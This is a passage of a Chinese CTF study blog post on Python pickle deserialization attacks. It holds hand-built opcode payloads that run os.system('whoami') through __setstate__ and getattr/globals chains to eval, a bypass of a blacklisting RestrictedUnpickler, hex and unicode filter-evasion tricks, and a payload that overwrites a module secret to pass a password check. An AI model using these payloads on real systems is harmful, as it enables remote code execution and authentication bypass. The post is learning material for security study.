+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">import pickle</span><br><span class="line">class Person:</span><br><span class="line">    def __init__(self, name, age=0):</span><br><span class="line">        self.name = name</span><br><span class="line">        self.age = age</span><br><span class="line"></span><br><span class="line">    def __str__(self):</span><br><span class="line">        return f&quot;name: &#123;self.name&#125;\nage: &#123;self.age&#125;&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class Child(Person):</span><br><span class="line">    def __setstate__(self, state):</span><br><span class="line">        print(&quot;invoke __setstate__&quot;)</span><br><span class="line">        self.name = state</span><br><span class="line">        self.age = 10</span><br><span class="line"></span><br><span class="line">    def __getstate__(self):</span><br><span class="line">        print(&quot;invoke __getstate__&quot;)</span><br><span class="line">        return &quot;Child&quot;</span><br><span class="line"></span><br><span class="line">opcode=b&quot;&quot;&quot;(c__main__</span><br><span class="line">Person</span><br><span class="line">S&#x27;Casual&#x27;</span><br><span class="line">I18</span><br><span class="line">o&#125;(S&quot;__setstate__&quot;</span><br><span class="line">cos</span><br><span class="line">system</span><br><span class="line">ubS&quot;whoami&quot;</span><br><span class="line">b.&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">&#125;空字典入栈</span><br><span class="line">u寻找栈中的上一个MARK，组合之间的数据（数据必须为偶数个来组合key-value）并全部添加或更新到该MARK之前的一个元素（必须为字典）中</span><br><span class="line">第一个b，此时没有setstate，故向对象的属性字典添加了一个新的键值对</span><br><span class="line">第二个b，因为对象已经有了__setstate__，故将栈中字节码b的前一个元素当成state，执行__setstate__(state)</span><br><span class="line">也就是os.system(command)</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">fake = pickle.loads(opcode)</span><br><span class="line">#xxx\21609</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>当然，这里看的我很莫名其妙</p>
+<h3 id="绕过builtins"><a href="#绕过builtins" class="headerlink" title="绕过builtins"></a>绕过builtins</h3><p>有些例子限制死了module&#x3D;&#x3D;”builtins”<br>builtins模块提供了python的内置函数，在解释器启动的时候自动导入<br>查看所包含的函数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import sys</span><br><span class="line">for i in sys.modules[&#x27;builtins&#x27;].__dict__:</span><br><span class="line">    print(i)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>我们的目的是构造print(eval(“<strong>import</strong>(‘os’).system(‘whoami’)”))</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">import pickle</span><br><span class="line">import builtins</span><br><span class="line">import os</span><br><span class="line">print(builtins.getattr(builtins,&#x27;eval&#x27;))# 获取对象属性值</span><br><span class="line"># &lt;built-in function eval&gt;</span><br><span class="line"># 但是我们c指令要给出instance，也就是说不能单独import builtins</span><br><span class="line">print(builtins.globals())#获取模块包含的内容</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">返回的字典最后一个是 &#x27;builtins&#x27;: &lt;module &#x27;builtins&#x27; (built-in)&gt;</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">print(builtins.getattr(builtins.dict,&#x27;get&#x27;))#获取get函数</span><br><span class="line">print(builtins.getattr(builtins.dict,&#x27;get&#x27;)(builtins.globals(),&#x27;builtins&#x27;))</span><br><span class="line"># builtins.dict.get()函数获取字典builtins.globals()的&#x27;builtins&#x27;对应的值</span><br><span class="line">print(builtins.getattr(builtins.getattr(builtins.dict,&#x27;get&#x27;)(builtins.globals(),&#x27;builtins&#x27;),&#x27;eval&#x27;))</span><br><span class="line"># &lt;built-in function eval&gt;</span><br><span class="line"></span><br><span class="line">opcode=b&quot;&quot;&quot;cbuiltins</span><br><span class="line">getattr</span><br><span class="line">(cbuiltins</span><br><span class="line">getattr</span><br><span class="line">(cbuiltins</span><br><span class="line">dict</span><br><span class="line">S&#x27;get&#x27;</span><br><span class="line">tR(cbuiltins</span><br><span class="line">globals</span><br><span class="line">)RS&#x27;builtins&#x27;</span><br><span class="line">tRS&#x27;eval&#x27;</span><br><span class="line">tR(S&#x27;__import__(&quot;os&quot;).system(&quot;whoami&quot;)&#x27;</span><br><span class="line">tR.&quot;&quot;&quot;</span><br><span class="line"># 上面代码从外层开始写，中间先是获取get函数，然后调用globals函数，参数为空元组</span><br><span class="line"># 然后一波操作获取到了eval函数，最后调用了eval(&#x27;__import__(&quot;os&quot;).system(&quot;whoami&quot;)&#x27;)</span><br><span class="line">pickle.loads(opcode) # xxx\21609</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">import pickle</span><br><span class="line">import io</span><br><span class="line">import builtins</span><br><span class="line"></span><br><span class="line">class RestrictedUnpickler(pickle.Unpickler):</span><br><span class="line">    blacklist = &#123;&#x27;eval&#x27;, &#x27;exec&#x27;, &#x27;execfile&#x27;, &#x27;compile&#x27;, &#x27;open&#x27;, &#x27;input&#x27;, &#x27;__import__&#x27;, &#x27;exit&#x27;&#125;</span><br><span class="line"></span><br><span class="line">    def find_class(self, module, name):</span><br><span class="line">        # Only allow safe classes from builtins.</span><br><span class="line">        if module == &quot;builtins&quot; and name not in self.blacklist:</span><br><span class="line">            return getattr(builtins, name)</span><br><span class="line">        # Forbid everything else.</span><br><span class="line">        raise pickle.UnpicklingError(&quot;global &#x27;%s.%s&#x27; is forbidden&quot; %</span><br><span class="line">                                     (module, name))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def restricted_loads(s):</span><br><span class="line">    &quot;&quot;&quot;Helper function analogous to pickle.loads().&quot;&quot;&quot;</span><br><span class="line">    return RestrictedUnpickler(io.BytesIO(s)).load()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">opcode = b&#x27;&#x27;&#x27;cbuiltins</span><br><span class="line">getattr</span><br><span class="line">(cbuiltins</span><br><span class="line">getattr</span><br><span class="line">(cbuiltins</span><br><span class="line">dict</span><br><span class="line">S&#x27;get&#x27;</span><br><span class="line">tR(cbuiltins</span><br><span class="line">globals</span><br><span class="line">)RS&#x27;__builtins__&#x27;</span><br><span class="line">tRS&#x27;eval&#x27;</span><br><span class="line">tR(S&#x27;__import__(&quot;os&quot;).system(&quot;whoami&quot;)&#x27;</span><br><span class="line">tR.</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">restricted_loads(opcode)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h3 id="绕过关键字过滤"><a href="#绕过关键字过滤" class="headerlink" title="绕过关键字过滤"></a>绕过关键字过滤</h3><p>1.十六进制绕过<br>操作码s能够识别十六进制字符串<br>S’\x73ecret’<br>2.使用V指令进行unicode绕过<br>Vsecr\u0065t<br>对于已导入的模块，我们可以通过sys.modules[‘xxx’]来获取该模块，然后通过内置函数dir()来列出模块中的所有属性。</p>
+<p> 由于pickle不支持列表索引、字典索引，所以我们不能直接获取所需的字符串。在Python中，我们可以通过reversed()函数来将列表逆序，并返回一个迭代对象。</p>
+<p> 然后通过next()函数来获取迭代对象的下一个元素，默认从第一个元素开始<br>hello.py</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">secret=&quot;this is a key&quot;</span><br></pre></td></tr></table></figure>
+<p>pk1.py</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">import pickle</span><br><span class="line">import sys</span><br><span class="line">import hello</span><br><span class="line">print(dir(sys.modules[&#x27;hello&#x27;]))</span><br><span class="line"># [&#x27;__builtins__&#x27;, &#x27;__cached__&#x27;, &#x27;__doc__&#x27;, &#x27;__file__&#x27;, &#x27;__loader__&#x27;, &#x27;__name__&#x27;, &#x27;__package__&#x27;, &#x27;__spec__&#x27;, &#x27;secret&#x27;]</span><br><span class="line">print(next(reversed(dir(sys.modules[&#x27;hello&#x27;]))))</span><br><span class="line"># secret</span><br><span class="line"># 下面手写opcode获取secret字符串</span><br><span class="line">opcode=b&quot;&quot;&quot;(((c__main__</span><br><span class="line">hello</span><br><span class="line">i__builtin__</span><br><span class="line">dir</span><br><span class="line">i__builtin__</span><br><span class="line">reversed</span><br><span class="line">i__builtin__</span><br><span class="line">next</span><br><span class="line">.&quot;&quot;&quot;</span><br><span class="line">print(pickle.loads(opcode))</span><br><span class="line"># secret</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>下面构造变量覆盖</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">import pickle</span><br><span class="line">import sys</span><br><span class="line">import hello</span><br><span class="line">class A(object):</span><br><span class="line">    def __init__(self,uname,password):</span><br><span class="line">        self.uname=uname</span><br><span class="line">        self.password=password</span><br><span class="line">def get_password(uname):</span><br><span class="line">    if uname==&quot;hello&quot;:</span><br><span class="line">        return hello.secret</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">opcode=b&quot;&quot;&quot;c__main__</span><br><span class="line">hello</span><br><span class="line">((((c__main__</span><br><span class="line">hello</span><br><span class="line">i__builtin__</span><br><span class="line">dir</span><br><span class="line">i__builtin__</span><br><span class="line">reversed</span><br><span class="line">i__builtin__</span><br><span class="line">next</span><br><span class="line">I999</span><br><span class="line">db(S&#x27;hello&#x27;</span><br><span class="line">I999</span><br><span class="line">i__main__</span><br><span class="line">A</span><br><span class="line">.&quot;&quot;&quot;</span><br><span class="line">a=pickle.loads(opcode)</span><br><span class="line">if a.uname==&#x27;hello&#x27;:</span><br><span class="line">    if(a.password==get_password(&#x27;hello&#x27;)): </span><br><span class="line">        #覆盖了hello模块的secret变量，使其与实例a的password相等</span><br><span class="line">        print(&quot;success&quot;)</span><br><span class="line">        #success</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>这些算是一些基本的知识了<br>我们这里当然想的是，能不能多做两个类似的题目来帮助我们解决对应的问题，达到一个更好的理解</p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>我会再次好好再学一下python的一些基础知识，目前这方面较为欠缺<br>会及时补上来的。会有这个知识的第三篇文章，并且附上py以及脚本题的解决<br>对于这种类型的题目，最简单的已经没有什么问题了。比如ikuu哥哥那道题目（因为过了session那一步之后，只要简单反序列化一次就可以了）<br>但是对于像羊城杯，[MTCTF 2022]easypickle的那种要绕过waf的，实在还是有点难理解</p>
+
+                
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        文章作者:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="/about" rel="external nofollow noreferrer">wuk0Ng</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        文章链接:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="https://web-wuk0ng.github.io/2025/07/18/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96(2)/">https://web-wuk0ng.github.io/2025/07/18/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96(2)/</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        版权声明:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    本博客所有文章除特別声明外，均采用
+                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
+                    许可协议。转载请注明来源
+                    <a href="/about" target="_blank">wuk0Ng</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            
+                                <a href="/tags/CTF/">
+                                    <span class="chip bg-color">CTF</span>
+                                </a>
+                            
+                                <a href="/tags/%E6%AF%94%E8%B5%9B/">
+                                    <span class="chip bg-color">比赛</span>
+                                </a>
+                            
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+<div id="article-share">
+
+    
+    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <script src="/libs/share/js/social-share.min.js"></script>
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+                <style>
+    #reward {
+        margin: 40px 0;
+        text-align: center;
+    }
+
+    #reward .reward-link {
+        font-size: 1.4rem;
+        line-height: 38px;
+    }
+
+    #reward .btn-floating:hover {
+        box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2), 0 5px 15px rgba(0, 0, 0, 0.2);
+    }
+
+    #rewardModal {
+        width: 320px;
+        height: 350px;
+    }
+
+    #rewardModal .reward-title {
+        margin: 15px auto;
+        padding-bottom: 5px;
+    }
+
+    #rewardModal .modal-content {
+        padding: 10px;
+    }
+
+    #rewardModal .close {
+        position: absolute;
+        right: 15px;
+        top: 15px;
+        color: rgba(0, 0, 0, 0.5);
+        font-size: 1.3rem;
+        line-height: 20px;
+        cursor: pointer;
+    }
+
+    #rewardModal .close:hover {
+        color: #ef5350;
+        transform: scale(1.3);
+        -moz-transform:scale(1.3);
+        -webkit-transform:scale(1.3);
+        -o-transform:scale(1.3);
+    }
+
+    #rewardModal .reward-tabs {
+        margin: 0 auto;
+        width: 210px;
+    }
+
+    .reward-tabs .tabs {
+        height: 38px;
+        margin: 10px auto;
+        padding-left: 0;
+    }
+
+    .reward-content ul {
+        padding-left: 0 !important;
+    }
+
+    .reward-tabs .tabs .tab {
+        height: 38px;
+        line-height: 38px;
+    }
+
+    .reward-tabs .tab a {
+        color: #fff;
+        background-color: #ccc;
+    }
+
+    .reward-tabs .tab a:hover {
+        background-color: #ccc;
+        color: #fff;
+    }
+
+    .reward-tabs .wechat-tab .active {
+        color: #fff !important;
+        background-color: #22AB38 !important;
+    }
+
+    .reward-tabs .alipay-tab .active {
+        color: #fff !important;
+        background-color: #019FE8 !important;
+    }
+
+    .reward-tabs .reward-img {
+        width: 210px;
+        height: 210px;
+    }
+</style>
+
+<div id="reward">
+    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>
+
+    <!-- Modal Structure -->
+    <div id="rewardModal" class="modal">
+        <div class="modal-content">
+            <a class="close modal-close"><i class="fas fa-times"></i></a>
+            <h4 class="reward-title">你的赏识是我前进的动力</h4>
+            <div class="reward-content">
+                <div class="reward-tabs">
+                    <ul class="tabs row">
+                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
+                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
+                    </ul>
+                    <div id="alipay">
+                        <img src="/medias/reward/aliyunpay.png" class="reward-img" alt="支付宝打赏二维码">
+                    </div>
+                    <div id="wechat">
+                        <img src="/medias/reward/wechat1.png" class="reward-img" alt="微信打赏二维码">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    $(function () {
+        $('.tabs').tabs();
+    });
+</script>
+
+            
+        </div>
+    </div>
+
+    
+        <!-- 引入 Gitalk 官方 CSS（国内 CDN） -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+
+<!-- 引入主题自定义 CSS（如有需要，若 my-gitalk.css 是本地文件则保留原路径） -->
+<link rel="stylesheet" href="/css/my-gitalk.css">
+
+<div class="card gitalk-card" data-aos="fade-up">
+  <div class="comment_headling">
+    <i class="fas fa-comments fa-fw"></i>
+    <span>评论</span>
+  </div>
+  <div id="gitalk-container" class="card-content"></div>
+</div>
+
+<!-- 引入 Gitalk 官方 JS（国内 CDN） -->
+<script src="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+<script>
+  let gitalk = new Gitalk({
+    clientID: 'Ov23liTNlK9NLcZwFSo8',
+    clientSecret: '7472cd54d6ca5e38d14f6d1b5176299bb4cf4ebe',
+    repo: 'blog---comments',
+    owner: 'web-wuk0Ng',
+    admin: ["web-wuk0Ng"],
+    id: '2025-07-18T14-00-00',
+    distractionFreeMode: false
+  });
+
+  gitalk.render('gitalk-container');
+</script>
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
+            <div class="card">
+                <a href="/2025/07/18/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96(2)/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/9.jpg" class="responsive-img" alt="pickle反序列化2">
+                        
+                        <span class="card-title">pickle反序列化2</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2025-07-18
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/%E8%AE%B0%E5%BD%95/" class="post-category">
+                                    记录
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/CTF/">
+                        <span class="chip bg-color">CTF</span>
+                    </a>
+                    
+                    <a href="/tags/%E6%AF%94%E8%B5%9B/">
+                        <span class="chip bg-color">比赛</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2025/07/16/cookie%E4%BC%AA%E9%80%A0%E7%B1%BB/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/17.jpg" class="responsive-img" alt="cookie伪造类">
+                        
+                        <span class="card-title">cookie伪造类</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2025-07-16
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/%E8%AE%B0%E5%BD%95/" class="post-category">
+                                    记录
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/CTF/">
+                        <span class="chip bg-color">CTF</span>
+                    </a>
+                    
+                    <a href="/tags/%E6%AF%94%E8%B5%9B/">
+                        <span class="chip bg-color">比赛</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+
+
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget card" style="background-color: white;">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('0'),
+            headingSelector: 'h1, h2, h3'
+        });
+
+        // modify the toc link href to support Chinese.
+        let i = 0;
+        let tocHeading = 'toc-heading-';
+        $('#toc-content a').each(function () {
+            $(this).attr('href', '#' + tocHeading + (++i));
+        });
+
+        // modify the heading title id to support Chinese.
+        i = 0;
+        $('#articleContent').children('h1, h2, h3').each(function () {
+            $(this).attr('id', tocHeading + (++i));
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
+    
+
+</main>
+
+
+
+
+    <footer class="page-footer bg-color">
+    
+    <div class="container row center-align" style="margin-bottom: 0px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            
+                <span id="year">2019-2025</span>
+            
+            <span id="year">2019</span>
+            <a href="/about" target="_blank">wuk0Ng</a>
+            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
+            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
+            <br>
+            
+            
+            
+            
+            
+            
+            <span id="busuanzi_container_site_pv">
+                |&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;<span id="busuanzi_value_site_pv"
+                    class="white-color"></span>&nbsp;次
+            </span>
+            
+            
+            <span id="busuanzi_container_site_uv">
+                |&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;<span id="busuanzi_value_site_uv"
+                    class="white-color"></span>&nbsp;人
+            </span>
+            
+            <br>
+            
+            <br>
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+    <a href="https://github.com/web-wuk0Ng" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <i class="fab fa-github"></i>
+    </a>
+
+
+
+    <a href="mailto:3134985131@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fas fa-envelope-open"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=3442584626" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 3442584626" data-position="top" data-delay="50">
+        <i class="fab fa-qq"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
+        <i class="fas fa-rss"></i>
+    </a>
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script type="text/javascript">
+$(function () {
+    var searchFunc = function (path, search_id, content_id) {
+        'use strict';
+        $.ajax({
+            url: path,
+            dataType: "xml",
+            success: function (xmlResponse) {
+                // get the contents from search data
+                var datas = $("entry", xmlResponse).map(function () {
+                    return {
+                        title: $("title", this).text(),
+                        content: $("content", this).text(),
+                        url: $("url", this).text()
+                    };
+                }).get();
+                var $input = document.getElementById(search_id);
+                var $resultContent = document.getElementById(content_id);
+                $input.addEventListener('input', function () {
+                    var str = '<ul class=\"search-result-list\">';
+                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+                    $resultContent.innerHTML = "";
+                    if (this.value.trim().length <= 0) {
+                        return;
+                    }
+                    // perform local searching
+                    datas.forEach(function (data) {
+                        var isMatch = true;
+                        var data_title = data.title.trim().toLowerCase();
+                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
+                        var data_url = data.url;
